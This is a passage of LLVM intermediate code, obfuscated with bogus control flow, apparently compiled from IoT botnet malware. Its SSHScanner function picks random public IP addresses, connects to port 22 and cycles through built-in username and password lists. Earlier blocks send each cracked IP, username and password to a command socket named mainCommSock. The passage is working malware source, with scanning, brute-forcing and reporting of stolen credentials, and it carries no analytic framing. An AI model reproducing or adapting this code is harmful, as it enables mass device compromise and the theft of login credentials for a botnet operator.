  store i8 0, i8* %3879, align 8
  %3880 = load i32, i32* %10, align 4
  %3881 = sext i32 %3880 to i64
  %3882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3881
  %3883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3882, i32 0, i32 3
  store i8 0, i8* %3883, align 1
  br label %originalBB273

originalBB278alteredBB:                           ; preds = %originalBB278, %2491
  %3884 = load i32, i32* %10, align 4
  %3885 = sext i32 %3884 to i64
  %3886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3885
  %3887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3886, i32 0, i32 8
  %3888 = load i8*, i8** %3887, align 8
  call void @llvm.memset.p0i8.i64(i8* %3888, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2579
  %3889 = load i32, i32* %10, align 4
  %3890 = sext i32 %3889 to i64
  %3891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3890
  %3892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3891, i32 0, i32 0
  %3893 = load i32, i32* %3892, align 16
  %3894 = load i32, i32* %10, align 4
  %3895 = sext i32 %3894 to i64
  %3896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3895
  %3897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3896, i32 0, i32 8
  %3898 = load i8*, i8** %3897, align 8
  %3899 = load i32, i32* %10, align 4
  %3900 = sext i32 %3899 to i64
  %3901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3900
  %3902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3901, i32 0, i32 7
  %3903 = load i16, i16* %3902, align 16
  %3904 = zext i16 %3903 to i32
  %3905 = call i32 @readUntil(i32 %3893, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3898, i32 1024, i32 %3904)
  %3906 = icmp ne i32 %3905, 0
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2661
  %3907 = load i32, i32* %10, align 4
  %3908 = sext i32 %3907 to i64
  %3909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3908
  %3910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3909, i32 0, i32 0
  %3911 = load i32, i32* %3910, align 16
  %3912 = load i32, i32* %10, align 4
  %3913 = sext i32 %3912 to i64
  %3914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3913
  %3915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3914, i32 0, i32 8
  %3916 = load i8*, i8** %3915, align 8
  %3917 = load i32, i32* %10, align 4
  %3918 = sext i32 %3917 to i64
  %3919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3918
  %3920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3919, i32 0, i32 7
  %3921 = load i16, i16* %3920, align 16
  %3922 = zext i16 %3921 to i32
  %3923 = call i32 @readUntil(i32 %3911, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3916, i32 1024, i32 %3922)
  %3924 = icmp ne i32 %3923, 0
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2755
  %3925 = load i32, i32* %10, align 4
  %3926 = sext i32 %3925 to i64
  %3927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3926
  %3928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3927, i32 0, i32 6
  %3929 = load i32, i32* %3928, align 4
  %_291 = shl i32 %3929, 10
  %_292 = sub i32 0, %3929
  %gen293 = add i32 %_292, 10
  %_294 = sub i32 0, %3929
  %gen295 = add i32 %_294, 10
  %_296 = sub i32 0, %3929
  %gen297 = add i32 %_296, 10
  %_298 = sub i32 0, %3929
  %gen299 = add i32 %_298, 10
  %_300 = sub i32 %3929, 10
  %gen301 = mul i32 %_300, 10
  %_302 = shl i32 %3929, 10
  %3930 = add i32 %3929, 10
  %3931 = zext i32 %3930 to i64
  %3932 = call i64 @time(i64* null) #2
  %3933 = icmp slt i64 %3931, %3932
  br label %originalBB290

originalBB306alteredBB:                           ; preds = %originalBB306, %2781
  %3934 = load i32, i32* %10, align 4
  %3935 = sext i32 %3934 to i64
  %3936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3935
  %3937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3936, i32 0, i32 0
  %3938 = load i32, i32* %3937, align 16
  %3939 = call i32 @sclose(i32 %3938)
  %3940 = load i32, i32* %10, align 4
  %3941 = sext i32 %3940 to i64
  %3942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3941
  %3943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3942, i32 0, i32 2
  store i8 0, i8* %3943, align 8
  %3944 = load i32, i32* %10, align 4
  %3945 = sext i32 %3944 to i64
  %3946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3945
  %3947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3946, i32 0, i32 3
  store i8 1, i8* %3947, align 1
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %2841
  %3948 = load i32, i32* %10, align 4
  %3949 = sext i32 %3948 to i64
  %3950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3949
  %3951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3950, i32 0, i32 0
  %3952 = load i32, i32* %3951, align 16
  %3953 = call i64 @send(i32 %3952, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i64 7, i32 16384)
  %3954 = icmp slt i64 %3953, 0
  br label %originalBB310

originalBB314alteredBB:                           ; preds = %originalBB314, %2865
  %3955 = load i32, i32* %10, align 4
  %3956 = sext i32 %3955 to i64
  %3957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3956
  %3958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3957, i32 0, i32 0
  %3959 = load i32, i32* %3958, align 16
  %3960 = call i32 @sclose(i32 %3959)
  %3961 = load i32, i32* %10, align 4
  %3962 = sext i32 %3961 to i64
  %3963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3962
  %3964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3963, i32 0, i32 2
  store i8 0, i8* %3964, align 8
  %3965 = load i32, i32* %10, align 4
  %3966 = sext i32 %3965 to i64
  %3967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3966
  %3968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3967, i32 0, i32 3
  store i8 1, i8* %3968, align 1
  br label %originalBB314

originalBB318alteredBB:                           ; preds = %originalBB318, %2896
  %3969 = load i32, i32* %10, align 4
  %3970 = sext i32 %3969 to i64
  %3971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3970
  %3972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3971, i32 0, i32 2
  store i8 9, i8* %3972, align 8
  br label %originalBB318

originalBB322alteredBB:                           ; preds = %originalBB322, %2940
  %3973 = load i32, i32* @mainCommSock, align 4
  %3974 = load i32, i32* %10, align 4
  %3975 = sext i32 %3974 to i64
  %3976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3975
  %3977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3976, i32 0, i32 1
  %3978 = bitcast i32* %3977 to %struct.in_addr*
  %3979 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3978, i32 0, i32 0
  %3980 = load i32, i32* %3979, align 4
  %3981 = call i8* @inet_ntoa(i32 %3980) #2
  %3982 = load i32, i32* %10, align 4
  %3983 = sext i32 %3982 to i64
  %3984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3983
  %3985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3984, i32 0, i32 4
  %3986 = load i8, i8* %3985, align 2
  %3987 = zext i8 %3986 to i64
  %3988 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %3987
  %3989 = load i8*, i8** %3988, align 8
  %3990 = load i32, i32* %10, align 4
  %3991 = sext i32 %3990 to i64
  %3992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3991
  %3993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3992, i32 0, i32 5
  %3994 = load i8, i8* %3993, align 1
  %3995 = zext i8 %3994 to i64
  %3996 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3995
  %3997 = load i8*, i8** %3996, align 8
  %3998 = call i32 (i32, i8*, ...) @sockprintf(i32 %3973, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %3981, i8* %3989, i8* %3997)
  %3999 = load i32, i32* %10, align 4
  %4000 = sext i32 %3999 to i64
  %4001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %4000
  %4002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4001, i32 0, i32 2
  store i8 10, i8* %4002, align 8
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %2998
  %4003 = load i32, i32* %10, align 4
  %4004 = sext i32 %4003 to i64
  %4005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %4004
  %4006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4005, i32 0, i32 0
  %4007 = load i32, i32* %4006, align 16
  %4008 = call i64 @send(i32 %4007, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.76, i32 0, i32 0), i64 49, i32 16384)
  %4009 = icmp slt i64 %4008, 0
  br label %originalBB326

originalBB330alteredBB:                           ; preds = %originalBB330, %3176
  %4010 = load i32, i32* %10, align 4
  %4011 = sext i32 %4010 to i64
  %4012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %4011
  %4013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4012, i32 0, i32 0
  %4014 = load i32, i32* %4013, align 16
  %4015 = load i32, i32* %10, align 4
  %4016 = sext i32 %4015 to i64
  %4017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %4016
  %4018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4017, i32 0, i32 8
  %4019 = load i8*, i8** %4018, align 8
  %4020 = load i32, i32* %10, align 4
  %4021 = sext i32 %4020 to i64
  %4022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %4021
  %4023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4022, i32 0, i32 7
  %4024 = load i16, i16* %4023, align 16
  %4025 = zext i16 %4024 to i32
  %4026 = call i32 @readUntil(i32 %4014, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %4019, i32 1024, i32 %4025)
  %4027 = icmp ne i32 %4026, 0
  br label %originalBB330

originalBB334alteredBB:                           ; preds = %originalBB334, %3295
  %4028 = load i32, i32* %10, align 4
  %4029 = sext i32 %4028 to i64
  %4030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %4029
  %4031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4030, i32 0, i32 0
  %4032 = load i32, i32* %4031, align 16
  %4033 = call i32 @sclose(i32 %4032)
  %4034 = load i32, i32* %10, align 4
  %4035 = sext i32 %4034 to i64
  %4036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %4035
  %4037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4036, i32 0, i32 2
  store i8 0, i8* %4037, align 8
  %4038 = load i32, i32* %10, align 4
  %4039 = sext i32 %4038 to i64
  %4040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %4039
  %4041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4040, i32 0, i32 3
  store i8 1, i8* %4041, align 1
  br label %originalBB334

originalBB338alteredBB:                           ; preds = %originalBB338, %3327
  br label %originalBB338

originalBB342alteredBB:                           ; preds = %originalBB342, %3344
  %4042 = load i32, i32* %10, align 4
  %_343 = shl i32 %4042, 1
  %_344 = shl i32 %4042, 1
  %_345 = sub i32 %4042, 1
  %gen346 = mul i32 %_345, 1
  %_347 = shl i32 %4042, 1
  %_348 = shl i32 %4042, 1
  %4043 = add nsw i32 %4042, 1
  store i32 %4043, i32* %10, align 4
  br label %originalBB342

originalBB352alteredBB:                           ; preds = %originalBB352, %3364
  br label %originalBB352
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @system(i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @SSHScanner() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 22) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %59

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %2, align 4
  br label %37

; <label>:59:                                     ; preds = %37
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %61, align 8
  br label %62

; <label>:62:                                     ; preds = %3227, %59
  br label %63

; <label>:63:                                     ; preds = %62
  store i32 0, i32* %2, align 4
  br label %64

; <label>:64:                                     ; preds = %3224, %63
  %65 = load i32, i32* @x.69
  %66 = load i32, i32* @y.70
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %64
  %73 = load i32, i32* %2, align 4
  %74 = load i32, i32* %1, align 4
  %75 = icmp slt i32 %73, %74
  %76 = load i32, i32* @x.69
  %77 = load i32, i32* @y.70
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %75, label %84, label %3227

; <label>:84:                                     ; preds = %originalBBpart2
  %85 = load i32, i32* %2, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %86
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %87, i32 0, i32 2
  %89 = load i8, i8* %88, align 8
  %90 = zext i8 %89 to i32
  switch i32 %90, label %3223 [
    i32 0, label %91
    i32 1, label %296
    i32 2, label %550
    i32 3, label %1069
    i32 4, label %1169
    i32 5, label %1626
    i32 6, label %1710
    i32 7, label %2716
    i32 8, label %2744
    i32 9, label %2804
    i32 10, label %2874
  ]

; <label>:91:                                     ; preds = %84
  %92 = load i32, i32* %2, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 8
  %96 = load i8*, i8** %95, align 8
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 1024, i32 1, i1 false)
  %97 = load i32, i32* %2, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %98
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %99, i32 0, i32 3
  %101 = load i8, i8* %100, align 1
  %102 = icmp ne i8 %101, 0
  br i1 %102, label %103, label %123

; <label>:103:                                    ; preds = %91
  %104 = load i32, i32* %2, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %105
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %106, i32 0, i32 8
  %108 = load i8*, i8** %107, align 8
  store i8* %108, i8** %11, align 8
  %109 = load i32, i32* %2, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %110
  %112 = bitcast %struct.telstate_t* %111 to i8*
  call void @llvm.memset.p0i8.i64(i8* %112, i8 0, i64 32, i32 16, i1 false)
  %113 = load i8*, i8** %11, align 8
  %114 = load i32, i32* %2, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %115
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %116, i32 0, i32 8
  store i8* %113, i8** %117, align 8
  %118 = call i32 @getRandomPublicIP()
  %119 = load i32, i32* %2, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %120
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %121, i32 0, i32 1
  store i32 %118, i32* %122, align 4
  br label %194

; <label>:123:                                    ; preds = %91
  %124 = load i32, i32* %2, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %125
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %126, i32 0, i32 5
  %128 = load i8, i8* %127, align 1
  %129 = add i8 %128, 1
  store i8 %129, i8* %127, align 1
  %130 = load i32, i32* %2, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %131
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %132, i32 0, i32 5
  %134 = load i8, i8* %133, align 1
  %135 = zext i8 %134 to i64
  %136 = icmp eq i64 %135, 13
  br i1 %136, label %137, label %148

; <label>:137:                                    ; preds = %123
  %138 = load i32, i32* %2, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %139
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %140, i32 0, i32 5
  store i8 0, i8* %141, align 1
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 4
  %146 = load i8, i8* %145, align 2
  %147 = add i8 %146, 1
  store i8 %147, i8* %145, align 2
  br label %148

; <label>:148:                                    ; preds = %137, %123
  %149 = load i32, i32* @x.69
  %150 = load i32, i32* @y.70
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %148
  %157 = load i32, i32* %2, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 4
  %161 = load i8, i8* %160, align 2
  %162 = zext i8 %161 to i64
  %163 = icmp eq i64 %162, 4
  %164 = load i32, i32* @x.69
  %165 = load i32, i32* @y.70
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %163, label %172, label %193

; <label>:172:                                    ; preds = %originalBBpart24
  %173 = load i32, i32* @x.69
  %174 = load i32, i32* @y.70
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %172
  %181 = load i32, i32* %2, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %182
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %183, i32 0, i32 3
  store i8 1, i8* %184, align 1
  %185 = load i32, i32* @x.69
  %186 = load i32, i32* @y.70
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %3224

; <label>:193:                                    ; preds = %originalBBpart24
  br label %194

; <label>:194:                                    ; preds = %193, %103
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %195, align 4
  %196 = call zeroext i16 @htons(i16 zeroext 22) #13
  %197 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %196, i16* %197, align 2
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %199 = getelementptr inbounds [8 x i8], [8 x i8]* %198, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %199, i8 0, i64 8, i32 4, i1 false)
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 1
  %204 = load i32, i32* %203, align 4
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %206 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %205, i32 0, i32 0
  store i32 %204, i32* %206, align 4
  %207 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %208 = load i32, i32* %2, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %209
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %210, i32 0, i32 0
  store i32 %207, i32* %211, align 16
  %212 = load i32, i32* %2, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %213
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 16
  %217 = bitcast %struct.timeval* %10 to i8*
  %218 = call i32 @setsockopt(i32 %216, i32 1, i32 20, i8* %217, i32 16) #2
  %219 = load i32, i32* %2, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 16
  %224 = bitcast %struct.timeval* %10 to i8*
  %225 = call i32 @setsockopt(i32 %223, i32 1, i32 21, i8* %224, i32 16) #2
  %226 = load i32, i32* %2, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %227
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 16
  %231 = icmp eq i32 %230, -1
  br i1 %231, label %232, label %233

; <label>:232:                                    ; preds = %194
  br label %3224

; <label>:233:                                    ; preds = %194
  %234 = load i32, i32* @x.69
  %235 = load i32, i32* @y.70
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %233
  %242 = load i32, i32* %2, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %243
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 16
  %247 = load i32, i32* %2, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 0
  %251 = load i32, i32* %250, align 16
  %252 = call i32 (i32, i32, ...) @fcntl(i32 %251, i32 3, i8* null)
  %253 = or i32 %252, 2048
  %254 = call i32 (i32, i32, ...) @fcntl(i32 %246, i32 4, i32 %253)
  %255 = load i32, i32* %2, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %256
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %257, i32 0, i32 0
  %259 = load i32, i32* %258, align 16
  %260 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %261 = call i32 @connect(i32 %259, %struct.sockaddr* %260, i32 16)
  %262 = icmp eq i32 %261, -1
  %263 = load i32, i32* @x.69
  %264 = load i32, i32* @y.70
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart214, label %originalBB10alteredBB

originalBBpart214:                                ; preds = %originalBB10
  br i1 %262, label %271, label %286

; <label>:271:                                    ; preds = %originalBBpart214
  %272 = call i32* @__errno_location() #13
  %273 = load i32, i32* %272, align 4
  %274 = icmp ne i32 %273, 115
  br i1 %274, label %275, label %286

; <label>:275:                                    ; preds = %271
  %276 = load i32, i32* %2, align 4
  %277 = sext i32 %276 to i64
